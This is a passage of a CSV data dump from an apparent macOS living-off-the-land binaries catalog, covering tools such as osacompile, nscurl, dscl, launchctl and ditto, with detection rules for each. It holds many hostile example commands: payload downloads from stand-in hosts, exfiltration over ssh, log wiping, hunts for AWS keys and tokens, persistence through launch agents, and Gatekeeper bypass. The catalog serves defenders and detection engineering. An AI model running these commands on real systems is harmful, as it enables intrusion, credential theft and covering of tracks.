Application.currentApplication();\ncurrentApp.includeStandardAdditions = true;\ncurrentApp.doShellScript('open -a Calculator.app');"" > calc.js && osascript -l JavaScript calc.js'']","[''Collection''-|-''Credential Access''-|-''Collection''-|-''Discovery''-|-''Credential Access''-|-''Execution'']","[''clipboard''-|-''bash''-|-''oneliner''-|-''osascript''-|-''systeminfo''-|-''oneliner''-|-''osascript''-|-''oneliner''-|-''prompt''-|-''osascript''-|-''jxa''-|-''osascript'']","/usr/bin/osascript","","[''Command Line Argument Detection (args contain osascript AND -e AND clipboard)''-|-''Jamf Protect: Detect activity that is related to osascript gathering clipboard content''-|-''Jamf Protect: Detect activity that is related to osascript pulling system information''-|-''Jamf Protect: Detect activity that is related to generating dialogs using osascript and asking for specific user input'']","[''N/A''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_clipboard''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_system_information''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_dialog_activity'']","","Using macOS Internals for Post Exploitation","https://medium.com/red-teaming-with-a-blue-team-mentality/using-macos-internals-for-post-exploitation-b5faaa11e121","","false"
"osacompile","Brendan Chamberlain (@infosecB)","Compile AppleScripts or OSA language scripts.","osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.","2023-05-14","","Download and compile a payload","The following command downloads an applescript payload from getpayload.com and compiles it into an app.","curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app","[''Command and Control''-|-''Resource Development'']","XCSSET","/usr/bin/osacompile","","Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)","https://github.com/SigmaHQ/sigma/pull/4127/commits/f4b0264a83e5f47473029e26dc0879fb196a7d07","","A bundle of nerves: Tweaking macOS security controls to thwart application bundle manipulation","https://redcanary.com/blog/mac-application-bundles/","","false"
"open","Brendan Chamberlain (@infosecb)","Open files, folders, apps, URLs, and header files.","The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS app.","2023-05-10","","[''Open a malicious file''-|-''Download a malicious file'']","[''The open command can be used to open a malicious macOS app from the terminal.''-|-''The following command downloads the payload.zip file in the default browser (Safari) and then kills it.'']","[''open Malicious.app''-|-''open -g https://mypayload.io/payload.zip; sleep 3; killall Safari'']","[''Execution''-|-''Execution'']","app","/usr/bin/open","","No detections at time of publishing","N/A","","The macOS open Command","https://scriptingosx.com/2017/02/the-macos-open-command/","","false"
"odutil","Ethan Nay","odutil allows caller to examine or change state of opendirectoryd","To look at internal state information for opendirectoryd, enable or disable logging, or change statistics settings.","2023-07-12","","[''Listing the available node names''-|-''Retrieves active session''-|-''Retrieves ""Default search policy""''-|-''Retrieves ""Contact search policy""'']","[''List all available node names''-|-''Retrieves the all active sessions''-|-''Retrieves the configuration of ""Default search policy""''-|-''Retrieves the configuration of ""Contact search policy""'']","[''odutil show nodenames''-|-''odutil show sessions''-|-''odutil show configuration /Search''-|-''odutil show configuration /Contacts'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/odutil","","No detections at time of publishing","N/A","","[''macOS/binaries/odutil''-|-''odutil man page'']","[''https://macosbin.com/bin/odutil''-|-''https://www.unix.com/man-page/osx/1/odutil/'']","","false"
"nvram","Brendan Chamberlain (@infosecB)","Access and manage the host's non-volatile random-access memory (NVRAM).","Access and manage the host's non-volatile random-access memory (NVRAM).","2023-05-23","","Get nvram variables","The -p option prints all the nvram variables that contain some potentially sensitive information like WiFi SSIDs and Bluetooth devices.","nvram -p","Discovery","","/usr/sbin/nvram","","No detections at time of publishing.","N/A","","SS64 man page","https://ss64.com/osx/nvram.html","Jonathan Bar Or (@yo_yo_yo_jbo)","false"
"nscurl","Leo Pitt (@_D00mfist)","Download, upload, and read files.","macOS version of curl that is used to download files to a target without applying the quarantine extended attribute","2023-05-22","","[''Download file''-|-''Download file''-|-''Download file'']","[''Download file and ignore cert checking''-|-''Download file to the Downloads directory using -dl''-|-''Download file to a designated directory using -dir'']","[''nscurl -k https://google.com -o /private/tmp/google''-|-''nscurl https://google.com -dl''-|-''nscurl https://google.com -dir /private/tmp/google'']","[''Defense Evasion''-|-''Command and Control''-|-''Defense Evasion''-|-''Command and Control''-|-''Defense Evasion''-|-''Command and Control'']","","/usr/bin/nscurl","","[''Jamf Protect: Detect all curl and nscurl activity''-|-''Jamf Protect: Detect file downloads using the insecure argument for curl and nscurl''-|-''Sigma: File Download Via Nscurl - MacOS'']","[''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/all_curl_activity''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/file_download_curl_insecure''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml'']","","[''How to Diagnose App Transport Security Issues using nscurl and OpenSSL''-|-''Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - nscurl'']","[''https://www.agnosticdev.com/content/how-diagnose-app-transport-security-issues-using-nscurl-and-openssl''-|-''https://danielcortez.substack.com/p/living-off-the-land-exploring-macos'']","","false"
"networksetup","Jason Trost (@jason_trost)","Configure network settings in System Preferences.","networksetup extensive tool for reading and setting various network configuration details useful for Discovery and Command and Control.","2023-04-22","","[''network device enumeration''-|-''Detect connected network hardware''-|-''network device enumeration''-|-''network device enumeration''-|-''DNS server enumeration''-|-''Enumerate configured web proxy URL for an interface''-|-''Enumerate configured web proxy for an interface''-|-''Set the https web proxy for an interface''-|-''Set the http web proxy for an interface''-|-''Set auto proxy URL for an interface''-|-''Enable auto proxy state'']","[''Use networksetup to display services with corresponding port and device in order they are tried for connecting to a network.''-|-''Use networksetup to detect new network hardware and create a default network service on the hardware.''-|-''Use networksetup to list all network interfaces, providing name, device name, MAC address.''-|-''Use networksetup to list all network interface names.''-|-''Use networksetup to get configured DNS servers for a specific interface.''-|-''Displays web proxy auto-configuration information for the specified interface.''-|-''Displays standard web proxy information for the specified interface.''-|-''Use networksetup to set the https web proxy for an interface.''-|-''Use networksetup to set the http web proxy for an interface.''-|-''Use networksetup to set the proxy URL for an interface.''-|-''Use networksetup to enable the proxy auto-config'']","[''networksetup -listnetworkserviceorder''-|-''networksetup -detectnewhardware''-|-''networksetup -listallhardwareports''-|-''networksetup -listallnetworkservices''-|-''networksetup -getdnsservers Wi-Fi''-|-''networksetup -getautoproxyurl ""Thunderbolt Ethernet""''-|-''networksetup -getwebproxy ""Wi-Fi""''-|-''networksetup -setsecurewebproxy ""Wi-Fi"" 46.226.108.171''-|-''networksetup -setwebproxy ""Wi-Fi"" 46.226.108.171''-|-''networksetup -setautoproxyurl ""Wi-Fi"" $autoProxyURL''-|-''networksetup -setautoproxystate ""Wi-Fi"" on'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Command and Control''-|-''Command and Control''-|-''Command and Control''-|-''Command and Control'']","[''network''-|-''configuration''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''dns''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy''-|-''network''-|-''configuration''-|-''proxy'']","/usr/sbin/networksetup","","No detections at time of publishing","N/A","","[''Threat Hunting the macOS edition Megan Carney (Report)''-|-''GrrCon 2018: Threat Hunting the macOS edition Megan Carney''-|-''Mac Malware of 2017 - a comprehensive analysis of the new mac malware of 17''-|-''Ay MaMi - Analyzing a New macOS DNS Hijacker: OSX/MaMi''-|-''Analyzing OSX.DazzleSpy - A fully-featured cyber-espionage macOS implant''-|-''The Mac Malware of 2018 - a comprehensive analysis of the new mac malware of - 18''-|-''From The DPRK With Love - analyzing a recent north korean macOS backdoor'']","[''https://megancarney.com/presentations/ExternalReport_ThreatHuntingMacOS.pdf''-|-''https://www.youtube.com/watch?v=_K4gnSuDkRM&feature=youtu.be''-|-''https://objective-see.org/blog/blog_0x25.html''-|-''https://objective-see.org/blog/blog_0x26.html''-|-''https://objective-see.org/blog/blog_0x6D.html''-|-''https://objective-see.org/blog/blog_0x3C.html''-|-''https://objective-see.org/blog/blog_0x6E.html'']","","false"
"mktemp","Tim Peck (@B0bby_Tablez)","Create a temporary file or directory and return the file/directory name to stdout","The mktemp binary located in ""usr/bin/mktemp"" can generate unique directory or file names and has historically been used to generate unique payloads.","2023-06-28","","[''Generate payload directory (Shlayer)''-|-''Generate directory based on template file (Bundlore)'']","[''The following command can be used to generate a random directory name for staging payloads''-|-''The following command can be used to generate a unique directory based on a template'']","[''export tmpDir=""$(mktemp -d /tmp/XXXXXXXXXXXX)""''-|-''TMP_DIR=""mktemp -d -t x""'']","[''Defense Evasion''-|-''Defense Evasion'']","[''Payload''-|-''Payload'']","/usr/bin/mktemp","","No detections at time of publishing","N/A","","[''Shlayer malware abusing Gatekeeper bypass on macOS''-|-''20 Common Tools & Techniques Used by macOS Threat Actors & Malware'']","[''https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/''-|-''https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/'']","","false"
"mdls","Daniel Stinson-Diess (@shellcromancer)","List metadata attributes for the specified file.","mdls list file metadata across standard metadata (creation date, size), extended attribute (quarantine), and Spotlight APIs (Finder flags).","2023-05-29","","[''Validate file download information''-|-''Query File Paths'']","[''Use mdls to validate payload download sources and timestamps to guard against sandbox executions.''-|-''Use mdls to print file paths and sizes when enumerating host resources.'']","[''mdls -name ""kMDItemWhereFroms"" -name ""kMDItemDownloadedDate""''-|-''xargs -0 mdls -n kMDItemPath -n kMDItemFSSize'']","[''Defense Evasion''-|-''Discovery'']","[''Genieo''-|-''Shlayer''-|-''CleanMaster'']","/usr/bin/mdls","","No detections at time of publishing","N/A","","","","","false"
"mdfind","Chris Campbell (@texasbe2trill)","Locate files using the Spotlight database.","mdfind to locate files on MacOS by searching a pre-built database. It is a command-line alternative to Spotlight in MacOS","2023-04-22","","[''Use mdfind to provide live updates to the number of files matching the query''-|-''Use mdfind to search for AWS Keys''-|-''Use mdfind to search for apps to infect'']","[''A bash or zsh oneliner can cause mdfind to provide an attacker with live updates to the number of files on a system.''-|-''Allows an attacker to query the filesystem via the CommandLine/Terminal to search for AWS keys.''-|-''Allows an attacker to determine if specific applications are installed and can be leveraged'']","[''mdfind -live passw''-|-''mdfind 'kMDItemTextContext == AKIA || kMDItemDisplayName = *AKIA* -onlyin ~'''-|-''set appId to do shell script ""mdfind kMDItemCFBundleIdentifier = '"" & bundleId & ""'""'']","[''Reconnaissance''-|-''Discovery''-|-''Reconnaissance''-|-''Discovery''-|-''Reconnaissance''-|-''Discovery''-|-''Defense Evasion'']","[''bash''-|-''zsh''-|-''oneliner''-|-''bash''-|-''zsh''-|-''oneliner''-|-''osascript''-|-''XCSSET'']","/usr/bin/mdfind","","Jamf Protect: Detect activity related to mdfind used to search for stored AWS keys","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/mdfind_search_aws_keys","","[''""Farming The Apple Orchards: Living off the Land Techniques"" - Chris Ross & Cedric Owens''-|-''""Zero-Day TCC bypass discovered in XCSSET malware"" - Jaron Bradley, Ferdous Saljooki, Stuart Ashenbrenner'']","[''https://youtu.be/Snwh4mMe-Cg?t=45''-|-''https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/'']","","false"
"lsregister","Brendan Chamberlain (@infosecB)","Interact with the macOS Launch Services database.","lsregister is used to build, dump, and check the validity of the Launch Services database. This database is often abused to create custom URL scheme handlers that point to malicious apps.","2023-05-15","","[''Force an update of the Launch Services database''-|-''Get a list of apps and their bindings''-|-''Delete the Launch Services database'']","[''The -f flag can be used to force an update of the Launch Services database. This can be used to quickly register a custom URL scheme that points to a malicious app.''-|-''The -dump flag can be used to get a list of apps and their bindings''-|-''The -delete flag can be used to delete the Launch Services database to impact normal operation of the system.'']","[''/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f''-|-''/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E ""path:|bindings:|name: | more""''-|-''lsregister -delete'']","[''Discovery''-|-''Discovery''-|-''Impact'']","","/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister","","No detections at time of publishing","N/A","","[''Remote Mac Exploitation Via Custom URL Schemes''-|-''macOS Security & Privilege Escalation'']","[''https://www.jamf.com/blog/remote-mac-exploitation-via-custom-url-schemes/''-|-''https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation'']","Patrick Wardle (@patrickwardle)","false"
"log","Brendan Chamberlain (@infosecB)","Access system log messages from Apple Unified Logging (AUL).","The log command can be used to access system log messages from Apple Unified Logging (AUL). The tool can be used to inspect exiting logs, stream logs in realtime, and delete logs. This tool is normally used by system admins and application developers for troubleshooting purposes but can be used by an adversary to gain an understanding of the user's behavior or to cover up their tracks by deleting log messages.","2023-06-06","","[''Remove all log messages''-|-''Search log messages for tokens'']","[''An attacker can cover up their tracks by removing all log messages using the following command. Requires root privileges.''-|-''An attacker can potentially search log messages and review if they do contain sensitive information like jwt tokens.'']","[''log erase --all''-|-''log show --info --debug --predicate 'eventMessage CONTAINS[d] ""eyJ""''']","[''Defense Evasion''-|-''Credential Access'']","[''requires_root''-|-''bash''-|-''zsh'']","/usr/bin/log","","No detections at time of publishing","N/A","","Living off the land in macOS (Daniel Stinson)","https://shellcromancer.io/posts/living-off-of-macos/","Daniel Stinson (@shellcromancer)","false"
"launchctl","Josh Carullo","Interact with LaunchAgents and LaunchDaemons.","launchctl can be used to load, start, stop, and unload macOS services. It is a command-line frontend to launchd.","2023-05-27","","[''Use launchctl to execute an application''-|-''Persistent launch agent'']","[''A oneliner that will load a plist as a LaunchAgent or LaunchDaemon, achieving persistence on a target machine. This command requires root privileges.''-|-''Creation of a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist'']","[''sudo launchctl load /Library/LaunchAgent/com.apple.installer''-|-''launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist'']","[''Execution''-|-''Persistence''-|-''Persistence'']","[''bash''-|-''zsh''-|-''oneliner'']","/bin/launchctl","","[''LaunchAgents and LaunchDaemons must have a plist file on disk in the root, system, or user Library directory. Monitoring for plist's with executables located in /tmp or /Shared could identify suspicious applications.''-|-''Jamf Protect: Detect launchctl activity that unloads or bootsout specific service'']","[''N/A''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/launchctl_unload_and_bootout_events'']","","[''20 Common Tools & Techniques used by macOS threat Actors & Malware''-|-''Mitre Attack Technique: launchctl T1569''-|-''MITRE ATT&CK T1543.001  Create or Modify System Process: Launch Agent ''-|-''Komplex OS X Trojan (Sofacy)'']","[''https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/''-|-''https://attack.mitre.org/techniques/T1569/001/''-|-''https://attack.mitre.org/techniques/T1543/001/''-|-''https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/'']","","false"
"last","Will Huang (@In0de_16)","Show last user logins and TTYs.","The command shows a list of user sessions including the user name, terminal used, host name, start and stop times, and duration. It also indicates if a session is still active or was terminated unexpectedly.","2023-04-27","","[''Enumerate the users who are currently logged into the system.''-|-''Enumerate all user accounts that have logged into the system previously.''-|-''Enumerate all hosts that have remotely logged into the system before.'']","[''The following command will display sessions that are currently active.''-|-''The last command can be used to output users who have previously logged in, by specifying the tty interface 'console'.''-|-''An attacker can use 'last' with a filter to retrieve the connection date and remote host information for remote logins.'']","[''last | grep ""still logged in""''-|-''last -t console''-|-''last | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+''']","[''Discovery''-|-''Discovery''-|-''Discovery'']","[''oneliner''-|-''account''-|-''oneliner''-|-''account''-|-''oneliner''-|-''network'']","/usr/bin/last","","System Network Connections Discovery","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml","","last Man Page","https://ss64.com/osx/last.html","","false"
"kextstat","Mark Morowczynsk (@markmorow)","Display the status of loaded kernal extensions (kexts)","Deprecated tool in favor of kmutil. Lists loaded kernal extensions","2023-07-30","","List kernel extensions","Uses kexstat showloaded to display kernel extensions and address in kernel memory it has been loaded","kexstat","Discovery","[''bash''-|-''zsh''-|-''kernel'']","/usr/sbin/kextstat","","No detections at time of publishing","n/a","","kextstat man page","https://ss64.com/osx/kextstat.html","","false"
"ioreg","Cedric Owens (@cedowens)","Displays a hierarchial view of the I/O Kit registry.","The I/O Kit registry (ioreg) is a useful binary that can be used to gather data such as detecting if a VM is used, getting USB device vendor names, checking if a screen is locked, etc.","2023-04-20","","[''Use ioreg to check whether the remote macOS screen is locked.''-|-''Use ioreg to check whether the host is on a physical machine or a VM''-|-''Use ioreg to check USB device vendor names''-|-''Check all ioreg properties for hypervisor names.'']","[''The following command will display a list of keys that contain ""CGSSession"". If the key ""CGSSessionScreenIsLocked"" is present, the screen is actively locked.''-|-''Check the output of this command (specifically the IOPlatformSerialNumber, board-id, and manufacturer fields) to check whether or not this host is in a virtual machine.''-|-''Grep for ""USB Vendor Name"" values to view USB vendor names. On virtualized hardware these values may contain the hypervisor name such as ""VirtualBox"". This is an additional way to check for virtualization.''-|-''Grep for ""virtual box"", ""oracle"", and ""vmware"" from the output of the ioreg -l command. This is an additional way to check for virtualization.'']","[''ioreg -n Root -d1 -a | grep CGSSession''-|-''ioreg -rd1 -c IOPlatformExpertDevice''-|-''ioreg -rd1 -c IOUSBHostDevice''-|-''ioreg -l'']","[''Discovery''-|-''Discovery''-|-''Collection''-|-''Discovery''-|-''Collection''-|-''Discovery''-|-''Collection'']","[''bash''-|-''oneliner''-|-''lockscreen''-|-''oneliner''-|-''vmcheck''-|-''oneliner''-|-''vmcheck''-|-''oneliner''-|-''vmcheck'']","/usr/sbin/ioreg","","[''System Information Discovery Using Ioreg''-|-''Jamf Protect: Ioreg used to detect if the screen is locked'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/lockscreen_check'']","","[''Evasions: macOS''-|-''SwiftBelt-JXA Situational Awareness Tool'']","[''https://evasions.checkpoint.com/src/MacOS/macos.html''-|-''https://github.com/cedowens/SwiftBelt-JXA/blob/main/SwiftBelt-JXA.js#520'']","","false"
"hdiutil","Mark Morowczynsk (@markmorow)","Manipulate disk images using the DiskImages framework.","hdiutil manipulates disk images such as DMG and ISO files. You can mount, unmount, create, resize and verify disk images. Including encrypted images.","2023-05-21","","[''Mount a malicious dmg file''-|-''Mount a malicious dmg file''-|-''Mount a malicious iso file''-|-''Mount a malicious iso file''-|-''Exfiltrate data in dmg file''-|-''Exfiltrate data in encrypted dmg file'']","[''Uses hdiutil to mount a malicious dmg file to''-|-''Uses hdiutil to mount a malicious dmg file to''-|-''Uses hdiutil to mount a malicious iso file to''-|-''Uses hdiutil to mount a malicious iso file to''-|-''Uses hdiutil to create a dmg file to store exfiltrate data''-|-''Uses hdiutil to create a dmg file to store exfiltrate data'']","[''hdiutil mount malicious.dmg''-|-''hdiutil attach malicious.dmg''-|-''hdiutil mount malicious.iso''-|-''hdiutil attach malicious.iso''-|-''hdiutil create -volname ""Volume Name"" -srcfolder /path/to/folder -ov diskimage.dmg''-|-''hdiutil create -encryption -stdinpass -volname ""Volume Name"" -srcfolder /path/to/folder -ov encrypteddiskimage.dmg'']","[''Execution''-|-''Execution''-|-''Execution''-|-''Execution''-|-''Collection''-|-''Collection'']","[''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk'']","/usr/bin/hdiutil","","[''Sigma: Disk Image Mounting Via Hdiutil''-|-''Sigma: Disk Image Creation Via Hdiutil'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml'']","","Microsoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection","https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/","","false"
"dsexport","Brendan Chamberlain (@infosecB)","Export data from an Open Directory directory services server.","dsexport is a command-line utility designed to export records from the directory services database on a local host or from a connected LDAP service. The tool can be used to gather information about users, groups, and computers. The tool can also be used to export the directory services database to a file for offline analysis.","2023-05-23","","[''Export local host users''-|-''Export local host groups'']","[''Export the local host user information to a file''-|-''Export the local host group information to a file'']","[''dsexport local_users.txt /Local/Default dsRecTypeStandard:Users''-|-''dsexport local_groups.txt /Local/Default dsRecTypeStandard:Groups'']","[''Reconnaissance''-|-''Discovery''-|-''Reconnaissance''-|-''Discovery'']","[''ldap''-|-''users''-|-''ldap''-|-''groups'']","/usr/bin/dsexport","","No detections at time of publishing","N/A","","","","","false"
"dsconfigad","Ethan Nay","retrieves/changes configuration for Directory Services Active Directory Plugin.","This tool allows command-line configuration of the Active Directory Plug-in. dsconfigad has the same functionality for configuring the Active Directory plugin as the Directory Utility application. It requires ""admin"" privileges to the local workstation and to the Directory to make changes.","2023-08-23","","[''Retrieves the Active Directory configuration''-|-''Retrieves the Active Directory name'']","[''Retrieves the Active Directory configuration''-|-''Retrieves the Active Directory name'']","[''dsconfigad -show''-|-''dsconfigad -show |awk '/Active Directory Domain/{print $NF}''']","[''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/sbin/dsconfigad","","No detections at time of publishing","N/A","","[''macOS/binaries/dsconfigad''-|-''dsconfigad man page'']","[''https://macosbin.com/bin/dsconfigad''-|-''https://www.unix.com/man-page/osx/8/dsconfigad/'']","","false"
"dscl","Jonathan Bar Or (@yo_yo_yo_jbo)","Interact with Directory Services.","An extensive tool for communicating with the Directory Services, useful for Discovery.","2023-04-25","","[''Local user enumeration''-|-''Active Directory user enumeration''-|-''Local user information gathering''-|-''Active Directory user information gathering''-|-''Local group enumeration''-|-''Active Directory group enumeration''-|-''Local group information gathering''-|-''Active Directory group information gathering''-|-''Computer enumration''-|-''Share enumration''-|-''Password policy discovery''-|-''Change a user password''-|-''Local account creation'']","[''Enumerate all local users.''-|-''Enumerate all Active Directory users.''-|-''Gain useful local user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.''-|-''Gain useful Active Directory user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.''-|-''Enumerate all local groups.''-|-''Enumerate all Active Directory groups.''-|-''Gain useful local group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the ""admin"" group.''-|-''Gain useful Active Directory group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the ""admin"" group.''-|-''Enumerate all computers in an Active Directory.''-|-''Enumerate all shares.''-|-''Gain password policy information''-|-''Change an existing user's password.''-|-''Create a local account'']","[''dscl . -list /Users dscl . list /Users dscl . ls /Users ''-|-''dscl ""/Active Directory/TEST/All Domains"" -list /Users dscl ""/Active Directory/TEST/All Domains"" list /Users dscl ""/Active Directory/TEST/All Domains"" ls /Users ''-|-''dscl . -read /Users/$USERNAME dscl . read /Users/$USERNAME dscl . cat /Users/$USERNAME ''-|-''dscl ""/Active Directory/TEST/All Domains"" -read /Users/$USERNAME dscl ""/Active Directory/TEST/All Domains"" read /Users/$USERNAME dscl ""/Active Directory/TEST/All Domains"" cat /Users/$USERNAME ''-|-''dscl . -list /Groups dscl . list /Groups dscl . ls /Groups ''-|-''dscl ""/Active Directory/TEST/All Domains"" -list /Groups dscl ""/Active Directory/TEST/All Domains"" list /Groups dscl ""/Active Directory/TEST/All Domains"" ls /Groups ''-|-''dscl . -read /Groups/$GROUPNAME dscl . read /Groups/$GROUPNAME dscl . cat /Groups/$GROUPNAME ''-|-''dscl ""/Active Directory/TEST/All Domains"" -read /Groups/$GROUPNAME dscl ""/Active Directory/TEST/All Domains"" read /Groups/$GROUPNAME dscl ""/Active Directory/TEST/All Domains"" cat /Groups/$GROUPNAME ''-|-''dscl  ""/Active Directory/TEST/All Domains"" -list /Computers dscl  ""/Active Directory/TEST/All Domains"" list /Computers dscl  ""/Active Directory/TEST/All Domains"" ls /Computers ''-|-''dscl . -list /SharePoints dscl . list /SharePoints dscl . ls /SharePoints ''-|-''dscl . -read /Config/shadowhash dscl . read /Config/shadowhash dscl . cat /Config/shadowhash ''-|-''dscl . passwd /Users/$USERNAME oldPassword newPassword''-|-''dscl -create'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Persistence''-|-''Persistence'']","[''users''-|-''network''-|-''users''-|-''users''-|-''configuration''-|-''network''-|-''users''-|-''configuration''-|-''groups''-|-''network''-|-''groups''-|-''groups''-|-''configuration''-|-''network''-|-''groups''-|-''configuration''-|-''network''-|-''shares''-|-''network''-|-''shares''-|-''password''-|-''policy''-|-''password'']","/usr/bin/dscl","","Jamf Protect: Detect user account creation with dscl","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/user_created_by_dscl","","[''MacOS Red Teaming - HackTricks''-|-''MITRE ATT&CK T1136.001 Create Account: Local Account'']","[''https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-red-teaming''-|-''https://attack.mitre.org/techniques/T1136/001/'']","","false"
"dscacheutil","Ethan Nay","gather information, statistics and initiate queries to the Directory Service cache.","dscacheutil does various operations against the Directory Service cache including gathering statistics, initiating lookups, inspection, cache flush, etc. This tool replaces most of the functionality of the lookupd tool previously available in the OS.","2023-08-23","","[''Lookup  a user''-|-''Lookup all users'']","[''List the user information''-|-''List the all users information'']","[''dscacheutil -q user -a name <USER_NAME>''-|-''dscacheutil -q user'']","[''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/dscacheutil","","No detections at time of publishing","N/A","","[''macOS/binaries/dscacheutil''-|-''dscacheutil man page'']","[''https://macosbin.com/bin/dscacheutil''-|-''https://ss64.com/osx/dscacheutil.html'']","","false"
"dns-sd","Brendan Chamberlain (@infosecB)","Discover local network services using the DNS-Based Service Discovery (SD) protocol.","dns-sd can be used to interact with the Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) protocols. The tool is useful for administrators but can also be abused by malicious actors to discover local network services.","2023-05-19","","[''Discover SSH hosts''-|-''Discover web hosts''-|-''Discover hosts serving remote screen sharing''-|-''Discover hosts serving SMB'']","[''Hosts serving SSH can be discovered using the _ssh._tcp service string.''-|-''Hosts serving web services can be discovered using the _http._tcp service string.''-|-''Hosts serving remote screen sharing can be discovered using the _rfb._tcp service string.''-|-''Hosts serving SMB can be discovered using the _smb._tcp service string.'']","[''dns-sd -B _ssh._tcp''-|-''dns-sd -B _http._tcp''-|-''dns-sd -B _rfb._tcp''-|-''dns-sd -B _smb._tcp'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''network''-|-''network''-|-''network''-|-''network'']","/usr/bin/dns-sd","","Jamf Protect: Detect dns-sd discovery activity","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/dns_service_discovery","","[''What does APT Activity Look Like on macOS?''-|-''mDNS / Bonjour Bible - List of Common Service Strings for various vendors'']","[''https://themittenmac.com/what-does-apt-activity-look-like-on-macos''-|-''https://jonathanmumm.com/tech-it/mdns-bonjour-bible-common-service-strings-for-various-vendors/'']","Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques","false"
"ditto","Brendan Chamberlain (@infosecB)","Copy files and directories while preserving file attributes and permissions.","ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.","2023-05-04","","[''Copy and compress sensitive data locally''-|-''Remove extended attributes from a file''-|-''Copy, compress, and transfer sensitive data to a remote macOS host''-|-''DLL hjiacking'']","[''The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.''-|-''ditto can be used to bypass Gatekeeper by removing the ""com.apple.quarantine"" extended attribute.''-|-''The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.''-|-''Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes.'']","[''ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip''-|-''ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null''-|-''ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t''-|-''ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib'']","[''Collection''-|-''Exfiltration''-|-''Collection''-|-''Exfiltration''-|-''Collection''-|-''Exfiltration''-|-''Lateral 